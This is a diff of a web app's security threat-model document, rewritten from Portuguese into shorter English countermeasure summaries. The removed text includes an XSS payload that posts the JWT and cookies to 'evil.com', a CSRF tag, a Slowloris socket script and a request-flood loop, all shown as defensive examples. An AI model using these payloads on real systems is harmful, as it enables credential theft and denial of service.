-            'content': self.sanitizeHtml(message.get('content', '')),
-            'recipientId': self.sanitizeId(message.get('recipientId', ''))
-        }
-    
-    def sanitizeId(self, userId: str) -> str:
-        """
-        MEDIDA 5: Whitelist para IDs
-        """
-        if not isinstance(userId, str):
-            raise ValueError("ID deve ser string")
-        
-        # Apenas alfanuméricos, underscore e hífen
-        if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', userId):
-            raise ValueError("ID inválido")
-        
-        return userId
-
-
-# Validação com Pydantic (camada adicional):
-from pydantic import BaseModel, validator
-
-class ChatMessageSchema(BaseModel):
-    content: str
-    recipientId: str
-    
-    @validator('content')
-    def sanitizeContent(cls, v):
-        """MEDIDA 6: Validação automática"""
-        sanitizer = InputSanitizer()
-        return sanitizer.sanitizeHtml(v)
-    
-    @validator('content')
-    def validateLength(cls, v):
-        """MEDIDA 7: Limite de tamanho"""
-        if len(v) > 2000:
-            raise ValueError('Mensagem muito longa (máx 2000 caracteres)')
-        
-        if len(v) < 1:
-            raise ValueError('Mensagem não pode estar vazia')
-        
-        return v
-    
-    @validator('recipientId')
-    def validateRecipient(cls, v):
-        """MEDIDA 8: Validação de destinatário"""
-        if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', v):
-            raise ValueError('ID de destinatário inválido')
-        return v
-
-
-# Uso na rota de mensagem:
-sanitizer = InputSanitizer()
-
-@router.post("/messages/send")
-async def sendMessage(message: ChatMessageSchema, userId: str = Depends(getCurrentUser)):
-    """Enviar mensagem com sanitização"""
-    
-    # Pydantic já sanitizou, mas dupla verificação
-    sanitizedContent = sanitizer.sanitizeHtml(message.content)
-    
-    # Salvar no banco
-    messageId = database.saveMessage({
-        'sender_id': userId,
-        'recipient_id': message.recipientId,
-        'content': sanitizedContent,
-        'created_at': datetime.utcnow()
-    })
-    
-    # Emitir via WebSocket
-    await socketManager.emitToUser(message.recipientId, 'new_message', {
-        'id': messageId,
-        'content': sanitizedContent,  # Já sanitizado
-        'sender_id': userId
-    })
-    
-    return {"message_id": messageId}
-```
-
-**MEDIDA 9: Content Security Policy (CSP)**
-
-```python
-# backend/middleware/security.py
-from fastapi import Request
-from starlette.middleware.base import BaseHTTPMiddleware
-
-class SecurityHeadersMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request: Request, call_next):
-        response = await call_next(request)
-        
-        # MEDIDA 10: CSP - Content Security Policy
-        response.headers['Content-Security-Policy'] = (
-            "default-src 'self'; "                    # Só do mesmo domínio
-            "script-src 'self' 'unsafe-inline'; "     # Scripts só do domínio
-            "style-src 'self' 'unsafe-inline'; "      # Estilos só do domínio
-            "img-src 'self' data: https:; "           # Imagens
-            "connect-src 'self' wss://noharm.app; "   # WebSocket
-            "font-src 'self'; "                       # Fontes
-            "object-src 'none'; "                     # Sem Flash/Java
-            "base-uri 'self'; "                       # Previne base tag injection
-            "form-action 'self'; "                    # Forms só para mesmo domínio
-            "frame-ancestors 'none'; "                # Não pode ser em iframe
-        )
-        
-        # Outros headers de segurança
-        response.headers['X-Content-Type-Options'] = 'nosniff'
-        response.headers['X-Frame-Options'] = 'DENY'
-        response.headers['X-XSS-Protection'] = '1; mode=block'
-        
-        return response
-```
-
-**Exemplo de ataque bloqueado:**
-
-```python
-# Atacante tenta XSS:
-maliciousMessage = """
-<img src=x onerror="
-  fetch('https://evil.com/steal', {
-    method: 'POST',
-    body: JSON.stringify({
-      token: localStorage.getItem('jwt'),
-      cookies: document.cookie
-    })
-  })
-">
-"""
-
-# Após sanitização:
-sanitizedMessage = ""  # Removido completamente
-
-# Ou se permitíssemos <img> mas não onerror:
-sanitizedMessage = "<img src=x>"  # Atributo perigoso removido
-```
+**Pending countermeasures:**
+- [ ] Add `model_config = ConfigDict(extra='forbid')` to all input schemas to actively reject unexpected fields rather than silently ignore them
 
 ---
 
-## 3. Ataques de Sessão
+## 3. Session Attacks
 
 ### 3.1 CSRF (Cross-Site Request Forgery)
 
-**O que é:**
-Site malicioso faz requisições para sua aplicação usando credenciais da vítima.
+**What it is:** A malicious site triggers authenticated requests to the API on behalf of the victim.
 
-**Como acontece:**
-```html
-<!-- evil.com -->
-<html>
-<body>
-  <!-- Vítima visita evil.com enquanto logada no NoHarm -->
-  <img src="https://noharm.app/api/counter/reset" />
-  
-  <!-- Navegador envia cookies automaticamente! -->
-  <!-- Contador resetado sem consentimento 🚨 -->
-</body>
-</html>
-```
+**Current posture:** The API uses JWT in the `Authorization: Bearer` header, not cookies. Browser-based CSRF attacks cannot forge this header — the attacker would need JavaScript access to the token, which is prevented by CORS and XSS protections.
 
-**Prevenção:**
-
-```python
-# backend/security/csrfProtection.py
-import secrets
-from typing import Optional
-from datetime import datetime, timedelta
-
-class CsrfProtection:
-    """
-    MEDIDA 1: CSRF Token (Double Submit Cookie)
-    """
-    def __init__(self):
-        self.tokens = {}  # {token: expiry}
-        self.tokenExpiry = timedelta(hours=24)
-    
-    def generateToken(self, userId: str) -> str:
-        """
-        Gera token CSRF único
-        """
-        # MEDIDA 2: Token criptograficamente seguro
-        token = secrets.token_urlsafe(32)
-        
-        # Armazena com expiração
-        expiry = datetime.utcnow() + self.tokenExpiry
-        self.tokens[token] = {
-            'user_id': userId,
-            'expiry': expiry
-        }
-        
-        return token
-    
-    def validateToken(self, token: str, userId: str) -> bool:
-        """
-        Valida token CSRF
-        """
-        if not token or token not in self.tokens:
-            return False
-        
-        tokenData = self.tokens[token]
-        
-        # Verifica expiração
-        if datetime.utcnow() > tokenData['expiry']:
-            del self.tokens[token]
-            return False
-        
-        # Verifica que token pertence ao usuário
-        if tokenData['user_id'] != userId:
-            return False
-        
-        return True
-    
-    def removeToken(self, token: str):
-        """Remove token após uso (single-use)"""
-        if token in self.tokens:
-            del self.tokens[token]
-
-
-csrfProtection = CsrfProtection()
-
-# Rota para obter CSRF token:
-@router.get("/csrf-token")
-async def getCsrfToken(userId: str = Depends(getCurrentUser)):
-    """
-    Cliente chama isto após login para obter CSRF token
-    """
-    token = csrfProtection.generateToken(userId)
-    
-    return {"csrf_token": token}
-
-
-# Middleware de validação CSRF:
-from fastapi import Request, HTTPException
-from starlette.middleware.base import BaseHTTPMiddleware
-
-class CsrfMiddleware(BaseHTTPMiddleware):
-    """
-    MEDIDA 3: Validar CSRF em todas requisições modificadoras
-    """
-    def __init__(self, app):
-        super().__init__(app)
-        self.exemptPaths = ['/api/login', '/api/register', '/api/csrf-token']
-    
-    async def dispatch(self, request: Request, call_next):
-        # Só valida métodos que modificam dados
-        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
-            # Pula rotas públicas
-            if request.url.path not in self.exemptPaths:
-                # Obtém token do header
-                csrfToken = request.headers.get('X-CSRF-Token')
-                
-                if not csrfToken:
-                    raise HTTPException(
-                        status_code=403,
-                        detail="CSRF token ausente"
-                    )
-                
-                # Obtém userId do JWT
-                authHeader = request.headers.get('Authorization', '')
-                if not authHeader.startswith('Bearer '):
-                    raise HTTPException(status_code=401, detail="Não autenticado")
-                
-                jwt_token = authHeader[7:]
-                payload = jwtHandler.verifyToken(jwt_token)
-                
-                if not payload:
-                    raise HTTPException(status_code=401, detail="Token inválido")
-                
-                userId = payload['sub']
-                
-                # Valida CSRF token
-                if not csrfProtection.validateToken(csrfToken, userId):
-                    raise HTTPException(
-                        status_code=403,
-                        detail="CSRF token inválido"
-                    )
-        
-        response = await call_next(request)
-        return response
-
-
-# MEDIDA 4: SameSite Cookie
-# --------------------------
-@router.post("/login")
-async def login(response: Response, username: str, password: str):
-    # ... autenticação ...
-    
-    # Definir cookie com SameSite=Strict
-    response.set_cookie(
-        key="refresh_token",
-        value=refreshToken,
-        httponly=True,      # Não acessível via JavaScript
-        secure=True,        # Apenas HTTPS
-        samesite="strict",  # CSRF protection
-        max_age=604800      # 7 dias
-    )
-    
-    return {"access_token": accessToken}
-```
-
-**Uso no cliente:**
-
-```javascript
-// 1. Obter CSRF token após login
-async function login(username, password) {
-  const loginResponse = await fetch('/api/login', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({username, password})
-  });
-  
-  const {access_token} = await loginResponse.json();
-  localStorage.setItem('jwt', access_token);
-  
-  // 2. Obter CSRF token
-  const csrfResponse = await fetch('/api/csrf-token', {
-    headers: {'Authorization': `Bearer ${access_token}`}
-  });
-  
-  const {csrf_token} = await csrfResponse.json();
-  localStorage.setItem('csrf_token', csrf_token);
-}
-
-// 3. Incluir CSRF token em todas requisições modificadoras
-async function resetCounter() {
-  const response = await fetch('/api/counter/reset', {
-    method: 'POST',
-    headers: {
-      'Authorization': `Bearer ${localStorage.getItem('jwt')}`,
-      'X-CSRF-Token': localStorage.getItem('csrf_token')  // ← Importante!
-    }
-  });
-}
-```
+**Pending countermeasures (for future cookie-based flows):**
+- [ ] Double-submit cookie pattern if cookies are introduced
+- [ ] `SameSite=Strict` on any cookies
+- [ ] Validate `Origin` / `Referer` on state-changing endpoints
 
 ---
 
-### 3.2 Session Fixation
+### 3.2 CORS Misconfiguration
 
-**O que é:**
-Atacante força vítima a usar session ID conhecido.
+**What it is:** Overly permissive CORS allows arbitrary origins to read API responses.
 
-**Como acontece:**
-```
-1. Atacante obtém session ID válido: abc123
-2. Atacante engana vítima para usar esse ID:
-   https://noharm.app/login?session=abc123
-3. Vítima faz login com esse session ID
-4. Atacante usa abc123 e está logado como vítima!
-```
-
-**Prevenção:**
+**Countermeasures implemented (`src/main.py`):**
 
 ```python
-# backend/security/sessionManager.py
-import secrets
-from datetime import datetime, timedelta
-from typing import Optional, Dict
-
-class SessionManager:
-    """
-    MEDIDA 1: Regenerar session ID após login
-    """
-    def __init__(self):
-        self.sessions: Dict[str, dict] = {}
-        self.sessionExpiry = timedelta(hours=24)
-    
-    def createSession(self, userId: str, deviceInfo: dict) -> str:
-        """
-        Cria nova sessão com ID único
-        """
-        # MEDIDA 2: Session ID criptograficamente seguro
-        sessionId = secrets.token_urlsafe(32)
-        
-        self.sessions[sessionId] = {
-            'user_id': userId,
-            'device_info': deviceInfo,
-            'created_at': datetime.utcnow(),
-            'last_activity': datetime.utcnow(),
-            'ip_address': deviceInfo.get('ip'),
-            'user_agent': deviceInfo.get('user_agent')
-        }
-        
-        return sessionId
-    
-    def regenerateSessionId(self, oldSessionId: str) -> Optional[str]:
-        """
-        MEDIDA 3: Regenera session ID (após login, mudança de privilégios)
-        """
-        if oldSessionId not in self.sessions:
-            return None
-        
-        # Dados da sessão antiga
-        sessionData = self.sessions[oldSessionId]
-        
-        # Remove sessão antiga
-        del self.sessions[oldSessionId]
-        
-        # Cria nova sessão com mesmo dados mas novo ID
-        newSessionId = secrets.token_urlsafe(32)
-        self.sessions[newSessionId] = sessionData
-        self.sessions[newSessionId]['regenerated_at'] = datetime.utcnow()
-        
-        return newSessionId
-    
-    def validateSession(self, sessionId: str, requestIp: str, userAgent: str) -> Optional[str]:
-        """
-        MEDIDA 4: Valida sessão com verificações de segurança
-        """
-        if sessionId not in self.sessions:
-            return None
-        
-        session = self.sessions[sessionId]
-        
-        # Verifica expiração
-        if datetime.utcnow() > session['created_at'] + self.sessionExpiry:
-            del self.sessions[sessionId]
-            return None
-        
-        # MEDIDA 5: Verifica mudança de IP (opcional, pode dar falso positivo)
-        # if session['ip_address'] != requestIp:
-        #     print(f"⚠️ IP mudou: {session['ip_address']} → {requestIp}")
-        #     # Pode forçar re-autenticação
-        
-        # MEDIDA 6: Verifica mudança de User-Agent
-        if session['user_agent'] != userAgent:
-            print(f"⚠️ User-Agent mudou")
-            # Possível session hijacking
-        
-        # Atualiza última atividade
-        session['last_activity'] = datetime.utcnow()
-        
-        return session['user_id']
-    
-    def destroySession(self, sessionId: str):
-        """Destroi sessão (logout)"""
-        if sessionId in self.sessions:
-            del self.sessions[sessionId]
-
-
-sessionManager = SessionManager()
-
-# Uso no login:
-@router.post("/login")
-async def login(request: Request, response: Response, username: str, password: str):
-    # Autenticar usuário
-    user = authenticateUser(username, password)
-    if not user:
-        raise HTTPException(status_code=401, detail="Credenciais inválidas")
-    
-    # Informações do dispositivo
-    deviceInfo = {
-        'ip': request.client.host,
-        'user_agent': request.headers.get('User-Agent', '')
-    }
-    
-    # MEDIDA 7: Criar NOVA sessão (nunca reusar)
-    sessionId = sessionManager.createSession(user.id, deviceInfo)
-    
-    # Criar tokens JWT
-    accessToken = jwtHandler.createAccessToken(userId=user.id)
-    refreshToken = jwtHandler.createRefreshToken(userId=user.id)
-    
-    # Definir cookie de sessão
-    response.set_cookie(
-        key="session_id",
-        value=sessionId,
-        httponly=True,
-        secure=True,
-        samesite="strict",
-        max_age=86400  # 24 horas
-    )
-    
-    return {
-        "access_token": accessToken,
-        "refresh_token": refreshToken
-    }
+allow_origins = config.ALLOWED_ORIGINS   # Explicit whitelist per environment
+allow_methods = ["GET", "POST", "PUT", "DELETE"]
+allow_headers = ["Authorization", "Content-Type"]
 ```
+
+In `development`, `ALLOWED_ORIGINS = ["*"]` is acceptable. In `staging` and `production` it is restricted to the app's origin.
 
 ---
 
-## 4. Ataques de Negação de Serviço (DoS/DDoS)
+## 4. Denial of Service
 
-### 4.1 Application Layer DoS
+### 4.1 Application-Layer DoS / Brute Force
 
-**O que é:**
-Atacante sobrecarrega servidor com requisições legítimas mas excessivas.
+**Countermeasures implemented (`src/security/rateLimiter.py`, `src/security/middleware.py`):**
 
-**Como acontece:**
-```python
-# Bot fazendo milhares de requisições:
-while True:
-    for i in range(1000):
-        requests.get('https://noharm.app/api/users/profile')
-        requests.post('https://noharm.app/api/messages/send', json={...})
-    time.sleep(0.1)  # 10.000 req/seg
-```
+`RateLimitMiddleware` applies `IpRateLimiter` globally on every request:
+- 60 requests / 60 seconds per IP
+- Excess requests → 429 with `Retry-After: 60`
+- IP blocked for 60 minutes after exceeding the limit
 
-**Prevenção:**
+`LoginRateLimiter` applies per-username limits on the login endpoint (see §1.2).
 
-```python
-# backend/security/advancedRateLimiter.py
-from collections import defaultdict
-from datetime import datetime, timedelta
-from typing import Tuple, Optional
-import hashlib
-
-class AdvancedRateLimiter:
-    """
-    Rate limiter com múltiplas estratégias
-    """
-    def __init__(self):
-        # MEDIDA 1: Sliding Window por IP
-        self.ipWindows = defaultdict(list)
-        
-        # MEDIDA 2: Sliding Window por usuário
-        self.userWindows = defaultdict(list)
-        
-        # MEDIDA 3: Burst protection (picos súbitos)
-        self.burstLimits = defaultdict(int)
-        
-        # MEDIDA 4: IP blacklist temporária
-        self.blacklistedIps = {}
-        
-        # Configurações
-        self.limitsPerMinute = {
-            'ip': 60,           # 60 req/min por IP
-            'user': 120,        # 120 req/min por usuário
-            'burst': 10         # Máximo 10 req/seg
-        }
-        
-        self.blacklistDuration = timedelta(hours=1)
-    
-    def checkRateLimit(
-        self, 
-        ip: str, 
-        userId: Optional[str] = None,
-        endpoint: str = None
-    ) -> Tuple[bool, str]:
-        """
-        Verifica rate limits em múltiplas camadas
-        Retorna: (permitido, motivo_bloqueio)
-        """
-        now = datetime.utcnow()
-        
-        # VERIFICAÇÃO 1: IP blacklisted?
-        if ip in self.blacklistedIps:
-            if now < self.blacklistedIps[ip]:
-                remaining = int((self.blacklistedIps[ip] - now).total_seconds())
-                return False, f"IP bloqueado por {remaining}s"
-            else:
-                del self.blacklistedIps[ip]
-        
-        # VERIFICAÇÃO 2: Burst protection (10 req/seg)
-        burstKey = f"{ip}:{int(now.timestamp())}"
-        self.burstLimits[burstKey] += 1
-        
-        if self.burstLimits[burstKey] > self.limitsPerMinute['burst']:
-            # Bloqueia IP por 1 hora
-            self.blacklistedIps[ip] = now + self.blacklistDuration
-            print(f"🚨 IP bloqueado por burst: {ip}")
-            return False, "Burst limit excedido"
-        
-        # VERIFICAÇÃO 3: Rate limit por IP (60/min)
-        ipAllowed, ipRemaining = self._checkWindow(
-            self.ipWindows[ip],
-            self.limitsPerMinute['ip'],
-            60  # janela de 1 minuto
-        )
-        
-        if not ipAllowed:
-            return False, f"Rate limit IP: {ipRemaining}s até próxima requisição"
-        
-        # VERIFICAÇÃO 4: Rate limit por usuário (120/min)
-        if userId:
-            userAllowed, userRemaining = self._checkWindow(
-                self.userWindows[userId],
-                self.limitsPerMinute['user'],
-                60
-            )
-            
-            if not userAllowed:
-                return False, f"Rate limit usuário: {userRemaining}s"
-        
-        # VERIFICAÇÃO 5: Rate limit por endpoint (previne abuse de endpoints caros)
-        if endpoint:
-            endpointKey = f"{ip}:{endpoint}"
-            endpointLimit = self._getEndpointLimit(endpoint)
-            
-            endpointAllowed, _ = self._checkWindow(
-                self.ipWindows[endpointKey],
-                endpointLimit,
-                60
-            )
-            
-            if not endpointAllowed:
-                return False, f"Rate limit endpoint: {endpoint}"
-        
-        # Registra requisição
-        self.ipWindows[ip].append(now)
-        if userId:
-            self.userWindows[userId].append(now)
-        
-        return True, ""
-    
-    def _checkWindow(
-        self, 
-        window: list, 
-        maxRequests: int, 
-        windowSeconds: int
-    ) -> Tuple[bool, int]:
-        """
-        Sliding window algorithm
-        """
-        now = datetime.utcnow()
-        cutoff = now - timedelta(seconds=windowSeconds)
-        
-        # Remove requisições antigas
-        window[:] = [ts for ts in window if ts > cutoff]
-        
-        # Verifica limite
-        if len(window) >= maxRequests:
-            # Calcula quando próxima requisição será permitida
-            oldestRequest = min(window)
-            nextAllowed = oldestRequest + timedelta(seconds=windowSeconds)
-            remaining = int((nextAllowed - now).total_seconds())
-            
-            return False, remaining
-        
-        return True, 0
-    
-    def _getEndpointLimit(self, endpoint: str) -> int:
-        """
-        MEDIDA 6: Limites diferentes por endpoint
-        """
-        expensiveEndpoints = {
-            '/api/users/search': 10,      # Busca: 10/min
-            '/api/reports/generate': 5,   # Relatórios: 5/min
-            '/api/export/data': 2         # Export: 2/min
-        }
-        
-        return expensiveEndpoints.get(endpoint, 60)  # Default: 60/min
-    
-    def cleanupOldData(self):
-        """
-        MEDIDA 7: Limpeza periódica de dados antigos
-        Chamar a cada 5 minutos
-        """
-        now = datetime.utcnow()
-        cutoff = now - timedelta(minutes=5)
-        
-        # Limpa burst limits antigos
-        oldBurstKeys = [
-            k for k, v in self.burstLimits.items()
-            if int(k.split(':')[1]) < int(cutoff.timestamp())
-        ]
-        for key in oldBurstKeys:
-            del self.burstLimits[key]
-        
-        # Limpa windows vazias
-        self.ipWindows = defaultdict(
-            list,
-            {k: v for k, v in self.ipWindows.items() if v}
-        )
-        self.userWindows = defaultdict(
-            list,
-            {k: v for k, v in self.userWindows.items() if v}
-        )
-
-
-# Middleware de Rate Limiting:
-rateLimiter = AdvancedRateLimiter()
-
-class RateLimitMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request: Request, call_next):
-        # Obter IP
-        clientIp = request.client.host
-        
-        # Obter userId se autenticado
-        userId = None
-        authHeader = request.headers.get('Authorization', '')
-        if authHeader.startswith('Bearer '):
-            token = authHeader[7:]
-            payload = jwtHandler.verifyToken(token)
-            if payload:
-                userId = payload['sub']
-        
-        # Verificar rate limit
-        allowed, reason = rateLimiter.checkRateLimit(
-            ip=clientIp,
-            userId=userId,
-            endpoint=request.url.path
-        )
-        
-        if not allowed:
-            # MEDIDA 8: Header Retry-After
-            response = JSONResponse(
-                status_code=429,
-                content={"error": "Rate limit excedido", "detail": reason}
-            )
-            response.headers['Retry-After'] = '60'  # Tentar novamente em 60s
-            return response
-        
-        response = await call_next(request)
-        
-        # MEDIDA 9: Informar limites nos headers
-        response.headers['X-RateLimit-Limit'] = '60'
-        response.headers['X-RateLimit-Remaining'] = str(
-            60 - len(rateLimiter.ipWindows[clientIp])
-        )
-        
-        return response
-```
+**Pending countermeasures:**
+- [ ] Per-endpoint rate limits (e.g. stricter limits on `/auth/login`, `/auth/refresh`)
+- [ ] Burst protection (e.g. max 10 requests/second before sliding window kicks in)
+- [ ] Redis-backed rate limiting for multi-instance deployments (current in-memory state is not shared across workers)
 
 ---
 
-### 4.2 Slowloris Attack
+### 4.2 Slowloris / Connection Exhaustion
 
-**O que é:**
-Atacante abre muitas conexões e as mantém abertas lentamente.
+**What it is:** Attacker keeps thousands of connections half-open, exhausting server threads.
 
-**Como acontece:**
-```python
-# Atacante abre 1000 conexões
-for i in range(1000):
-    sock = socket.socket()
-    sock.connect(('noharm.app', 443))
-    
-    # Envia header parcial
-    sock.send(b"GET / HTTP/1.1\r\n")
-    
-    # Espera... envia mais um pouco
-    time.sleep(10)
-    sock.send(b"Host: noharm.app\r\n")
-    
-    # Nunca completa requisição
-    # Servidor fica esperando...
-```
-
-**Prevenção:**
-
-```python
-# backend/main.py
-from fastapi import FastAPI
-import uvicorn
-
-app = FastAPI()
-
-# MEDIDA 1: Configuração do servidor Uvicorn
-if __name__ == "__main__":
-    uvicorn.run(
-        app,
-        host="0.0.0.0",
-        port=8000,
-        
-        # Timeouts contra Slowloris
-        timeout_keep_alive=5,       # Fecha conexão idle após 5s
-        timeout_graceful_shutdown=10,
-        
-        # Limites de conexão
-        limit_concurrency=1000,     # Máximo 1000 conexões simultâneas
-        limit_max_requests=10000,   # Reinicia worker após 10k requisições
-        
-        # Limites de tamanho
-        h11_max_incomplete_event_size=16384,  # 16KB header máximo
-    )
-
-
-# MEDIDA 2: Nginx como proxy reverso (recomendado)
-# nginx.conf
-"""
-server {
-    listen 443 ssl;
-    server_name noharm.app;
-    
-    # Proteção contra Slowloris
-    client_body_timeout 10s;     # Timeout para corpo da requisição
-    client_header_timeout 10s;   # Timeout para headers
-    keepalive_timeout 5s;        # Timeout de keep-alive
-    send_timeout 10s;            # Timeout de envio
-    
-    # Limites de tamanho
-    client_max_body_size 1m;     # Máximo 1MB de body
-    client_header_buffer_size 1k;
-    large_client_header_buffers 2 1k;
-    
-    # Rate limiting no Nginx
-    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
-    limit_req zone=api burst=20 nodelay;
-    
-    # Proxy para FastAPI
-    location / {
-        proxy_pass http://127.0.0.1:8000;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        
-        # Timeouts de proxy
-        proxy_connect_timeout 5s;
-        proxy_send_timeout 10s;
-        proxy_read_timeout 10s;
-    }
-}
-"""
-```
+**Countermeasures (infrastructure-level, pending):**
+- [ ] Configure Uvicorn `timeout_keep_alive=5`, `limit_concurrency=1000`
+- [ ] Nginx reverse proxy with `client_header_timeout 10s`, `client_body_timeout 10s`, `keepalive_timeout 5s`
+- [ ] `client_max_body_size 1m` to reject oversized payloads early
 
 ---
 
-## 5. Ataques de Dados
+## 5. Data Attacks
 
-### 5.1 Data Exposure (Exposição de Dados)
+### 5.1 Data Exposure
 
-**O que é:**
-Dados sensíveis vazam através de APIs, logs ou erros.
+**What it is:** Sensitive data leaks through API responses, logs, or error messages.
 
-**Como acontece:**
-```python
-# Código VULNERÁVEL ❌
-@router.get("/users/{user_id}")
-async def getUser(userId: str):
-    user = database.getUserById(userId)
-    
-    # Retorna TUDO, incluindo dados sensíveis
-    return user  # {id, username, email, password_hash, ssn, credit_card, ...}
+**Countermeasures implemented:**
 
+**Field-level encryption at rest** (`src/security/encryption.py`):
+- All sensitive columns (username, email, message content, timestamps) are encrypted with AES-256 (Fernet) before being written to PostgreSQL
+- Obfuscated column names (`cl_0a`, `cl_0b`, ...) add an additional layer of obscurity
+- Each encrypted column has a parallel `_hash` column (SHA-256) for equality queries
 
-# Logs VULNERÁVEIS ❌
-logger.info(f"User logged in: {user.email}, password: {password}")
-# Senha em texto plano no log! 🚨
-```
+**Response filtering:**
+- Pydantic `response_model` on every route ensures only declared fields are returned
+- `passwordHash` and internal columns are never included in any response schema
 
-**Prevenção:**
-
-```python
-# backend/models/userModel.py
-from pydantic import BaseModel, EmailStr, Field
-from typing import Optional
-from datetime import datetime
-
-class UserInDB(BaseModel):
-    """
-    Modelo COMPLETO (nunca retornar isto ao cliente!)
-    """
-    id: str
-    username: str
-    email: EmailStr
-    password_hash: str              # ← SENSÍVEL
-    phone: Optional[str]
-    created_at: datetime
-    last_login: Optional[datetime]
-    reset_token: Optional[str]      # ← SENSÍVEL
-    mfa_secret: Optional[str]       # ← SENSÍVEL
-    
-    class Config:
-        orm_mode = True
-
-
-class UserPublicProfile(BaseModel):
-    """
-    MEDIDA 1: Modelo público (apenas dados não-sensíveis)
-    """
-    id: str
-    username: str
-    created_at: datetime
-    
-    # NÃO inclui: email, password_hash, phone, tokens
-
-
-class UserPrivateProfile(BaseModel):
-    """
-    MEDIDA 2: Modelo privado (próprio usuário)
-    """
-    id: str
-    username: str
-    email: EmailStr
-    phone: Optional[str]
-    created_at: datetime
-    last_login: Optional[datetime]
-    
-    # NÃO inclui: password_hash, reset_token, mfa_secret
-
-
-class UserSafeUpdate(BaseModel):
-    """
-    MEDIDA 3: Modelo para atualizações (whitelist de campos)
-    """
-    username: Optional[str] = Field(None, min_length=3, max_length=30)
-    phone: Optional[str] = Field(None, regex=r'^\+?[1-9]\d{1,14}$')
-    
-    # NÃO permite atualizar: id, email, password (precisam de endpoints separados)
-
-
-# Uso nas rotas:
-@router.get("/users/{user_id}", response_model=UserPublicProfile)
-async def getUserProfile(userId: str):
-    """
-    MEDIDA 4: response_model filtra automaticamente
-    """
-    user = database.getUserById(userId)
-    
-    if not user:
-        raise HTTPException(status_code=404, detail="Usuário não encontrado")
-    
-    # Retorna usuário COMPLETO mas FastAPI filtra para UserPublicProfile
-    return user
-
-
-@router.get("/me", response_model=UserPrivateProfile)
-async def getMyProfile(currentUserId: str = Depends(getCurrentUser)):
-    """
-    Perfil privado - mais informações
-    """
-    user = database.getUserById(currentUserId)
-    return user
-
-
-@router.put("/me", response_model=UserPrivateProfile)
-async def updateMyProfile(
-    updates: UserSafeUpdate,
-    currentUserId: str = Depends(getCurrentUser)
-):
-    """
-    MEDIDA 5: Whitelist de campos atualizáveis
-    """
-    # Apenas campos em UserSafeUpdate podem ser atualizados
-    updatedUser = database.updateUser(currentUserId, updates.dict(exclude_unset=True))
-    return updatedUser
-
-
-# MEDIDA 6: Sanitização de logs
-class SafeLogger:
-    """Logger que remove dados sensíveis"""
-    
-    SENSITIVE_FIELDS = {'password', 'token', 'secret', 'api_key', 'credit_card', 'ssn'}
-    
-    def sanitize(self, data: dict) -> dict:
-        """Remove campos sensíveis"""
-        if not isinstance(data, dict):
-            return data
-        
-        sanitized = {}
-        for key, value in data.items():
-            if key.lower() in self.SENSITIVE_FIELDS:
-                sanitized[key] = '***REDACTED***'
-            elif isinstance(value, dict):
-                sanitized[key] = self.sanitize(value)
-            else:
-                sanitized[key] = value
-        
-        return sanitized
-    
-    def info(self, message: str, data: dict = None):
-        """Log seguro"""
-        if data:
-            sanitized = self.sanitize(data)
-            logger.info(f"{message}: {sanitized}")
-        else:
-            logger.info(message)
-
-
-safeLogger = SafeLogger()
-
-# Uso:
-safeLogger.info("User logged in", {
-    "user_id": user.id,
-    "email": user.email,
-    "password": "secret123"  # Será redacted
-})
-# Output: User logged in: {'user_id': '123', 'email': 'user@email.com', 'password': '***REDACTED***'}
-```
+**Pending countermeasures:**
+- [ ] Structured log sanitisation — ensure no sensitive values appear in log output
+- [ ] Add `response_model_exclude_unset=True` where appropriate to avoid leaking default values
 
 ---
 
-### 5.2 Mass Assignment
+### 5.2 Insecure Direct Object Reference (IDOR)
 
-**O que é:**
-Atacante envia campos extras que não deveria poder modificar.
+**What it is:** A user accesses another user's resources by guessing or iterating resource IDs.
 
-**Como acontece:**
-```python
-# Código VULNERÁVEL ❌
-@router.put("/users/update")
-async def updateUser(userId: str, **kwargs):
-    # Aceita QUALQUER campo
-    database.updateUser(userId, kwargs)
+**Countermeasures implemented:**
+- All primary keys are **UUIDs** (v4), not sequential integers — not guessable
+- `getCurrentUser` dependency injects the authenticated user's ID into every protected route
 
-# Atacante envia:
-PUT /users/update
-{
-  "username": "hacker",
-  "is_admin": true,        ← Campo que não deveria modificar!
-  "account_balance": 1000000
-}
-```
-
-**Prevenção:**
-
-```python
-# backend/routes/userRoutes.py
-from pydantic import BaseModel, validator
-from typing import Optional
-
-class UserUpdateRequest(BaseModel):
-    """
-    MEDIDA 1: Whitelist explícita de campos
-    """
-    username: Optional[str]
-    bio: Optional[str]
-    avatar_url: Optional[str]
-    
-    # NÃO permite: is_admin, account_balance, email, etc
-    
-    @validator('username')
-    def validateUsername(cls, v):
-        if v is not None:
-            if len(v) < 3 or len(v) > 30:
-                raise ValueError('Username deve ter 3-30 caracteres')
-            if not re.match(r'^[a-zA-Z0-9_-]+$', v):
-                raise ValueError('Username inválido')
-        return v
-
-
-@router.put("/users/me")
-async def updateProfile(
-    updates: UserUpdateRequest,  # ← Apenas campos permitidos
-    currentUserId: str = Depends(getCurrentUser)
-):
-    """
-    MEDIDA 2: Pydantic rejeita campos extras automaticamente
-    """
-    # Apenas campos definidos em UserUpdateRequest são aceitos
-    updatedUser = database.updateUser(
-        currentUserId,
-        updates.dict(exclude_unset=True)  # Só campos enviados
-    )
-    
-    return updatedUser
-
-
-# MEDIDA 3: Campos sensíveis em endpoints separados
-class EmailChangeRequest(BaseModel):
-    new_email: EmailStr
-    password: str  # Requer senha atual
-    
-    @validator('new_email')
-    def validateEmail(cls, v, values):
-        # Validações adicionais
-        if '+' in v:
-            raise ValueError('Email com + não permitido')
-        return v
-
-
-@router.put("/users/email")
-async def changeEmail(
-    request: EmailChangeRequest,
-    currentUserId: str = Depends(getCurrentUser)
-):
-    """
-    Mudança de email requer autenticação separada
-    """
-    user = database.getUserById(currentUserId)
-    
-    # MEDIDA 4: Requer senha atual
-    if not bcrypt.checkpw(request.password.encode(), user.password_hash.encode()):
-        raise HTTPException(status_code=401, detail="Senha incorreta")
-    
-    # MEDIDA 5: Verificação de email
-    verificationToken = secrets.token_urlsafe(32)
